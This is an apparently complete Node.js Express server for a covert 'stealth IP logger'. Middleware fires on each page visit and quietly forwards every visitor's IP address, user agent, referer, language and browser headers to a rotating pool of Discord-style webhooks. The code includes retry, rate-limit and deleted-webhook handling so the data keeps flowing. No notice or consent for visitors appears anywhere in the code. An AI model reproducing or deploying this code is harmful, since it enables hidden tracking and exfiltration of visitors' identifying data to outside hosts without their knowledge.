// Debug deployment information
console.log('🚀 Server starting...');
console.log('📁 Current directory:', __dirname);
console.log('🔧 Node version:', process.version);
console.log('🌍 Platform:', process.platform);
console.log('📦 Package.json location:', require.resolve('./package.json'));

// Load environment variables (works with Vercel env vars)
try {
  if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config({ path: './token.env' });
  }
} catch (error) {
  console.error('❌ Failed to load environment variables:', error.message);
}

// Debug environment variables
console.log('🔧 Environment Debug:');
console.log('NODE_ENV:', process.env.NODE_ENV);
console.log('WEBSITE_NAME:', process.env.WEBSITE_NAME);
console.log('WEBHOOK_COUNT:', process.env.WEBHOOK_COUNT);

const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

// Import the stealth webhook service
let StealthWebhookService;
try {
  StealthWebhookService = require('./api/stealthWebhookService');
  console.log('✅ StealthWebhookService loaded successfully');
} catch (error) {
  console.error('❌ Failed to load StealthWebhookService:', error.message);
  process.exit(1);
}

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize webhook service
let webhookService;
try {
  webhookService = new StealthWebhookService();
  console.log('✅ WebhookService initialized successfully');
} catch (error) {
  console.error('❌ Failed to initialize WebhookService:', error.message);
  process.exit(1);
}

// Debug webhook service
console.log('🔗 Webhook Service Debug:');
console.log('Webhook count loaded:', webhookService.webhooks.length);
console.log('First webhook URL:', webhookService.webhooks[0]?.url ? 'SET' : 'NOT SET');
if (webhookService.webhooks.length === 0) {
  console.error('❌ No webhooks loaded! Check WEBHOOK_URL_1 through WEBHOOK_URL_13');
}

// CORS configuration
app.use(cors({
  origin: true,
  credentials: true
}));

// Security headers middleware
const addSecurityHeaders = (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
};

app.use(addSecurityHeaders);

// Serve static files
app.use(express.static(path.join(__dirname, 'dist')));

// Body parsing middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Stealth IP logging endpoint
app.post('/api/stealth/log', async (req, res) => {
  console.log('🚨 Stealth log endpoint called');
  console.log('Client IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
  console.log('Host header:', req.headers.host);
  console.log('Origin header:', req.headers.origin);
  console.log('Referer header:', req.headers.referer);
  console.log('Request headers:', JSON.stringify(req.headers, null, 2));

  try {
    if (!webhookService) {
      throw new Error('WebhookService not initialized');
    }
    if (webhookService.webhooks.length === 0) {
      throw new Error('No webhooks available');
    }

    // Get client information
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();
    
    // Get website information from headers
    const host = req.headers.host || 'unknown';
    const origin = req.headers.origin || '';
    const referer = req.headers.referer || '';
    
    // Get additional user information
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
    const accept = req.headers.accept || 'Unknown';
    const cacheControl = req.headers['cache-control'] || 'Unknown';
    const connection = req.headers.connection || 'Unknown';
    const secFetchDest = req.headers['sec-fetch-dest'] || 'Unknown';
    const secFetchMode = req.headers['sec-fetch-mode'] || 'Unknown';
    const secFetchSite = req.headers['sec-fetch-site'] || 'Unknown';
    const secFetchUser = req.headers['sec-fetch-user'] || 'Unknown';
    const upgradeInsecureRequests = req.headers['upgrade-insecure-requests'] || 'Unknown';
    
    // Get request details from body
    const requestBody = req.body || {};
    const requestPath = requestBody.path || req.path || 'Unknown';
    const requestMethod = requestBody.method || req.method || 'Unknown';
    
    // Determine website URL and name
    let websiteUrl = origin || `https://${host}`;
    let websiteName = host.split('.')[0]; // Extract subdomain or domain name
    
    // Clean up website name
    if (websiteName === 'www') {
      websiteName = host.split('.').slice(1, -1).join('.');
    }
    
    // Capitalize first letter
    websiteName = websiteName.charAt(0).toUpperCase() + websiteName.slice(1);

    console.log('📤 Message details:', {
      clientIP,
      websiteUrl,
      websiteName,
      host,
      origin,
      referer,
      userAgent: userAgent.substring(0, 50) + '...',
      acceptLanguage,
      requestPath,
      requestMethod
    });

    // Create enhanced payload with comprehensive user info
    const enhancedPayload = {
      embeds: [{
        title: `🌐 New Visitor on ${websiteName}`,
        description: `Someone visited your website!`,
        color: 0x00ff00,
        fields: [
          {
            name: '📍 IP Address',
            value: `\`${clientIP}\``,
            inline: true
          },
          {
            name: '🌍 Website',
            value: `\`${websiteUrl}\``,
            inline: true
          },
          {
            name: '🕒 Timestamp',
            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: true
          },
          {
            name: '🔍 User Agent',
            value: `\`\`\`${userAgent}\`\`\``,
            inline: false
          },
          {
            name: '📱 Referer',
            value: referer ? `\`${referer}\`` : '`Direct Visit`',
            inline: false
          },
          {
            name: '🌐 Request Details',
            value: `**Path:** \`${requestPath}\`\n**Method:** \`${requestMethod}\`\n**Host:** \`${host}\``,
            inline: false
          },
          {
            name: '🌍 Browser Info',
            value: `**Language:** \`${acceptLanguage}\`\n**Encoding:** \`${acceptEncoding}\`\n**Accept:** \`${accept.substring(0, 100)}${accept.length > 100 ? '...' : ''}\``,
            inline: false
          },
          {
            name: '🔒 Security Headers',
            value: `**Cache Control:** \`${cacheControl}\`\n**Connection:** \`${connection}\`\n**Sec-Fetch-Dest:** \`${secFetchDest}\`\n**Sec-Fetch-Mode:** \`${secFetchMode}\`\n**Sec-Fetch-Site:** \`${secFetchSite}\`\n**Sec-Fetch-User:** \`${secFetchUser}\`\n**Upgrade-Insecure-Requests:** \`${upgradeInsecureRequests}\``,
            inline: false
          }
        ],
        footer: {
          text: `${websiteName} IP Logger • ${new Date().toLocaleDateString()}`
        },
        timestamp: timestamp
      }]
    };

    console.log('📤 Enhanced payload created');

    let lastError = null;
    const maxRetries = webhookService.webhooks.length; // Try all webhooks

    for (let retry = 0; retry < maxRetries; retry++) {
      try {
        console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
        const webhook = await webhookService.getNextAvailableWebhook();

        if (!webhook) {
          console.error('❌ No available webhooks found');
          throw new Error('No available webhooks');
        }

        console.log(`📤 Using webhook: ${webhook.id}`);

        // Check for spam before sending
        if (webhookService.checkSpam(webhook.id)) {
          console.log(`🚨 Spam detected on webhook ${webhook.id}, handling...`);
          await webhookService.handleSpam(webhook.id);
          continue; // Try with next webhook
        }

        console.log(`📤 Sending to webhook URL: ${webhook.url.substring(0, 50)}...`);

        const response = await fetch(webhook.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(enhancedPayload),
          timeout: 10000
        });

        console.log(`📤 Webhook response status: ${response.status}`);

        if (response.ok) {
          // Success - update webhook stats
          webhook.lastUsed = Date.now();
          webhook.failureCount = 0;
          webhook.lastFailure = null;

          console.log('✅ Webhook message sent successfully');
          return res.status(200).json({ 
            success: true, 
            result: {
              success: true,
              webhookId: webhook.id,
              message: 'Message sent successfully',
              websiteName,
              websiteUrl
            }
          });
        } else {
          // Handle different error responses
          const responseText = await response.text();
          console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);

          if (response.status === 404) {
            // Webhook was deleted - mark as inactive
            console.log(`❌ Webhook ${webhook.id} was deleted (404), marking as inactive`);
            webhook.status = 'inactive';
            webhook.failureCount = webhookService.maxFailures + 1;
            webhook.lastFailure = Date.now();
            console.log(`⚠️ Cannot create new webhook (no bot available)`);
          } else if (response.status === 429) {
            // Rate limited - wait and retry
            const retryAfter = response.headers.get('retry-after') || 60;
            console.log(`⏳ Rate limited, waiting ${retryAfter} seconds...`);
            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
          } else {
            webhook.failureCount++;
            webhook.lastFailure = Date.now();
            console.log(`❌ Webhook ${webhook.id} failed (${response.status})`);
          }

          lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
      } catch (error) {
        console.error(`❌ Webhook attempt ${retry + 1} failed:`, error.message);
        lastError = error;

        // Mark current webhook as failed
        if (webhookService.webhooks[webhookService.currentWebhookIndex]) {
          webhookService.webhooks[webhookService.currentWebhookIndex].failureCount++;
          webhookService.webhooks[webhookService.currentWebhookIndex].lastFailure = Date.now();
        }
      }

      // Wait before retry
      if (retry < maxRetries - 1) {
        console.log(`⏳ Waiting ${webhookService.retryDelay}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, webhookService.retryDelay));
      }
    }

    console.error(`❌ Failed to send message after ${maxRetries} retries`);
    throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
  } catch (error) {
    console.error('❌ Webhook error:', error.message);
    console.error('❌ Error stack:', error.stack);
    console.error('❌ Webhook service state:', {
      initialized: !!webhookService,
      webhookCount: webhookService?.webhooks?.length || 0
    });
    res.status(200).json({ success: false, error: error.message });
  }
});

// Stealth IP logging middleware - triggers when someone visits the site
app.use((req, res, next) => {
  try {
    // Skip API calls and static files
    if (req.path.startsWith('/api/') || 
        req.path.startsWith('/_next/') || 
        req.path.includes('.')) {
      return next();
    }
    
    console.log('👤 Visitor detected:', req.path);
    console.log('IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
    console.log('User-Agent:', req.headers['user-agent'] || 'Unknown');
    console.log('Host:', req.headers.host);
    console.log('Referer:', req.headers.referer);
    console.log('Accept-Language:', req.headers['accept-language']);
    console.log('Accept-Encoding:', req.headers['accept-encoding']);
    
    // Log visitor IP asynchronously (don't block the request)
    setTimeout(async () => {
      try {
        console.log('🔄 Calling stealth log endpoint...');
        const host = req.get('host') || 'localhost:3000';
        const protocol = req.protocol || 'http';
        const stealthUrl = `${protocol}://${host}/api/stealth/log`;
        
        console.log('📡 Stealth URL:', stealthUrl);
        
        const response = await fetch(stealthUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': req.headers['user-agent'] || 'Unknown',
            'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || 'unknown',
            'Host': req.headers.host,
            'Referer': req.headers.referer || '',
            'Accept-Language': req.headers['accept-language'] || '',
            'Accept-Encoding': req.headers['accept-encoding'] || '',
            'Accept': req.headers.accept || '',
            'Cache-Control': req.headers['cache-control'] || '',
            'Connection': req.headers.connection || '',
            'Sec-Fetch-Dest': req.headers['sec-fetch-dest'] || '',
            'Sec-Fetch-Mode': req.headers['sec-fetch-mode'] || '',
            'Sec-Fetch-Site': req.headers['sec-fetch-site'] || '',
            'Sec-Fetch-User': req.headers['sec-fetch-user'] || '',
            'Upgrade-Insecure-Requests': req.headers['upgrade-insecure-requests'] || ''
          },
          body: JSON.stringify({
            path: req.path,
            method: req.method,
            timestamp: new Date().toISOString()
          })
        });
        
        console.log('📡 Stealth log response status:', response.status);
        if (!response.ok) {
          const errorText = await response.text();
          console.error('❌ Stealth log response error:', errorText);
        } else {
          console.log('✅ Stealth log sent successfully');
        }
        // Silent operation - no logging
      } catch (error) {
        console.error('❌ Stealth log error:', error.message);
        console.error('❌ Error stack:', error.stack);
        // Silent error handling for stealth operation
      }
    }, 0);
    
    next();
  } catch (error) {
    console.error('❌ Middleware error:', error.message);
    next();
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  try {
    const health = {
      status: 'healthy',
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
      webhookCount: webhookService?.webhooks?.length || 0,
      webhookService: !!webhookService,
      webhookUrls: webhookService?.webhooks?.map(w => w.url ? 'SET' : 'NOT SET') || []
    };
    
    console.log('🏥 Health check:', health);
    res.json(health);
  } catch (error) {
    console.error('❌ Health check error:', error.message);
    res.status(500).json({ 
      status: 'error', 
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Simple test endpoint
app.get('/api/test', (req, res) => {
  res.json({
    message: 'Server is working!',
    timestamp: new Date().toISOString(),
    webhooks: webhookService.webhooks.length
  });
});

// Test webhook endpoint (for debugging)
app.post('/api/test-webhook', async (req, res) => {
  console.log('🧪 Test webhook endpoint called');
  
  try {
    if (!webhookService) {
      throw new Error('WebhookService not initialized');
    }
    
    if (webhookService.webhooks.length === 0) {
      throw new Error('No webhooks available');
    }
    
    const payload = {
      content: "🧪 **Test Message** 🧪\n\n✅ Webhook system is working!\n🕒 Test timestamp: " + new Date().toISOString(),
      username: "IP Logger Test Bot",
      avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/test.png"
    };

    console.log('📤 Sending test webhook...');
    const result = await webhookService.sendMessage(payload, req);
    console.log('✅ Test webhook sent successfully:', result);
    res.json({ success: true, result });
  } catch (error) {
    console.error('❌ Test webhook error:', error.message);
    console.error('❌ Error stack:', error.stack);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Manual webhook validation endpoint
app.post('/api/validate-webhooks', async (req, res) => {
  console.log('🔍 Manual webhook validation requested');
  try {
    if (!webhookService) {
      throw new Error('WebhookService not initialized');
    }
    
    await webhookService.validateAndCleanupWebhooks();
    
    const status = webhookService.getWebhookStatus();
    console.log('✅ Webhook validation completed');
    
    res.json({
      success: true,
      message: 'Webhook validation completed',
      status: status
    });
  } catch (error) {
    console.error('❌ Webhook validation error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Webhook status endpoint
app.get('/api/webhook-status', (req, res) => {
  try {
    if (!webhookService) {
      throw new Error('WebhookService not initialized');
    }
    
    const status = webhookService.getWebhookStatus();
    const spamStats = webhookService.getSpamStats();
    
    res.json({
      success: true,
      webhooks: status,
      spamStats: spamStats,
      totalWebhooks: webhookService.webhooks.length,
      activeWebhooks: webhookService.webhooks.filter(w => w.status === 'active').length
    });
  } catch (error) {
    console.error('❌ Webhook status error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Catch-all route for SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Start server
const startServer = async () => {
  try {
    console.log('🚀 Starting server...');
    console.log('🔧 Server configuration:', {
      port: PORT,
      environment: process.env.NODE_ENV || 'development',
      webhookCount: webhookService?.webhooks?.length || 0
    });
    
    // Start the server
    app.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`🔗 Webhook count: ${webhookService?.webhooks?.length || 0}`);
      console.log(`🔗 Available endpoints:`);
      console.log(`   - GET /api/health`);
      console.log(`   - GET /api/test`);
      console.log(`   - POST /api/test-webhook`);
      console.log(`   - POST /api/stealth/log`);
    });

  } catch (error) {
    console.error('❌ Failed to start server:', error.message);
    console.error('❌ Server error stack:', error.stack);
    process.exit(1);
  }
};

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

// Start the server
startServer(); 